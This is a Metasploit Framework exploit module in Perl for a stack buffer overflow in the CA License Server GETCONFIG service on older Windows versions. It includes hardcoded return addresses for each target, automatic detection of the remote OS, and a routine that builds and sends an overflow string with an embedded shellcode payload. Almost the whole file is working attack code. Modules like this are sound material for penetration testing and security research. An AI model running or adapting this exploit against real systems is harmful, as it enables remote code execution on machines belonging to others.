##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::calicserv_getconfig;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
{
'Name' => 'CA License Server GETCONFIG Overflow',
'Version' => '$Revision: 1.8 $',
'Authors' => [ 'Thor Doomen <syscall [at] hushmail.com>' ],
'Arch' => [ 'x86' ],
'OS' => [ 'win32', 'win2000', 'winxp', 'win2003' ],
'Priv' => 1,
'AutoOpts' => { 'EXITFUNC' => 'thread' },
'UserOpts' => {
'RHOST' => [1, 'ADDR', 'The target address'],
'RPORT' => [1, 'PORT', 'The target port', 10202],
},

'Payload' =>
{
'Space' => 600,
'BadChars' => "\x00\x20",
'Prepend' => "\x81\xc4\x54\xf2\xff\xff",
'Keys' => ['+ws2ord'],
},

'Description' => Pex::Text::Freeform(qq{
This module exploits an vulnerability in the CA License Server
network service. This is a simple stack overflow and just one of
many serious problems with this software.
}),

'Refs' =>
[
['BID', '12705'],
['CVE', '005-0581'],
['URL', 'http://www.idefense.com/application/poi/display?id=213&type=vulnerabilities'],
],

'Targets' => [

# As much as I would like to return back to the DLL or EXE,
# all of those modules have a leading NULL in the
# loaded @ address :(

['Automatic', 0],
['Windows 2000 English', 0x750217ae, 0x7ffde0cc], # ws2help.dll esi + peb
['Windows XP English SP0-1', 0x71aa16e5, 0x7ffde0cc], # ws2help.dll esi + peb
['Windows XP English SP2', 0x71aa1b22, 0x71aa5001], # ws2help.dll esi + .data
['Windows 2003 English SP0', 0x71bf175f, 0x7ffde0cc], # ws2help.dll esi + peb
],
'Keys' => ['calicense'],
};

sub new {
my $class = shift;
my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
return($self);
}

sub Check {
my $self = shift;
my $target_host = $self->GetVar('RHOST');
my $target_port = $self->GetVar('RPORT');
my $data = $self->GetConfig($target_host, $target_port);
if (! $data) {
$self->PrintLine("[*] Could not read remote configuration");
return $self->CheckCode('Connect');
}

$self->PrintLine("[*] License Server: $data");
return $self->CheckCode('Detected');
}

sub Exploit {
my $self = shift;
my $target_host = $self->GetVar('RHOST');
my $target_port = $self->GetVar('RPORT');
my $target_idx = $self->GetVar('TARGET');
my $shellcode = $self->GetVar('EncodedPayload')->Payload;
my $target = $self->Targets->[$target_idx];

if ($target_idx == 0) {
my $data = $self->GetConfig($target_host, $target_port);
if ($data =~ m/OS\<([^\>]+)/) {
my $os = $1;
$os =~ s/_NT//g;
$os =~ s/5\.1/XP/;
$os =~ s/5\.2/2003/;
$os =~ s/5\.0/2000/;
$os =~ s/4\.0/NT 4.0/;

my @targs;
for (1 .. (scalar(@{$self->Targets})-1)) {
if (index($self->Targets->[$_]->[0], $os) != -1) {
push @targs, $_;
}
}

if (scalar(@targs) > 1) {
$self->PrintLine("[*] Multiple possible targets:");
foreach (@targs) {
$self->PrintLine("[*] $_\t".$self->Targets->[$_]->[0]);
}
return;
}

if (scalar(@targs) == 1) {
$target = $self->Targets->[$targs[0]];
}

if (! scalar(@targs)) {
$self->PrintLine("[*] No matching target for $os");
return;
}

} else {
$self->PrintLine("[*] Could not determine the remote OS automatically");
return;
}
}

$self->PrintLine("[*] Attempting to exploit target " . $target->[0]);

my $s = Msf::Socket::Tcp->new
(
'PeerAddr' => $target_host,
'PeerPort' => $target_port,
'LocalPort' => $self->GetVar('CPORT'),
'SSL' => $self->GetVar('SSL'),
);

if ($s->IsError) {
$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
return;
}

# Read the initial greeting from the license server
my $res = $s->Recv(-1, 1);
if (! $res || $res !~ /GETCONFIG/) {
$self->PrintLine("[*] The server did not return the expected greeting");
return;
}

my $boom = Pex::Text::EnglishText(900);

# 144 -> original return address
# 148 -> avoid exception by patching with writable address
# 928 -> seh handler (not useful under XP SP2)

substr($boom, 144, 4, pack('V', $target->[1])); # jmp esi
substr($boom, 148, 4, pack('V', $target->[2])); # writable address
substr($boom, 272, length($shellcode), $shellcode);

my $req = "A0 GETCONFIG SELF $boom<EOM>";

$self->PrintLine("[*] Sending " .length($req) . " bytes to remote host.");
$s->Send($req);

return;
}

# Returns data in the following format
#A0 GCR HOSTNAME<BOOFERM>HARDWARE<009c059010204>LOCALE<English>
IDENT1<unknown>IDENT2<unknown>IDENT3<unknown>IDENT4<unknown>OS
<Windows_NT 5.1>OLFFILE<0 0 0>SERVER<RMT>VERSION<3 1.54.0>NETWORK
<11.11.11.111 unknown 255.255.255.0>MACHINE<DESKTOP>CHECKSUMS
<0 0 0 0 0 0 0 0 0 0 0 0>RMTV<1.00><EOM>

sub GetConfig {
my $self = shift;
my $target_host = shift;
my $target_port = shift;

my $s = Msf::Socket::Tcp->new
(
'PeerAddr' => $target_host,
'PeerPort' => $target_port,
'LocalPort' => $self->GetVar('CPORT'),
'SSL' => $self->GetVar('SSL'),
);

if ($s->IsError) {
$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
return;
}

# Recieve the message that is first sent
$s->Recv(-1, 1);

# Ask for the configuration info
$s->Send("A0 GETCONFIG SELF 0<EOM>");
my $res = $s->Recv(-1, 2);

# Close the socket
$s->Close;

# Return the data
return $res;
}

1;
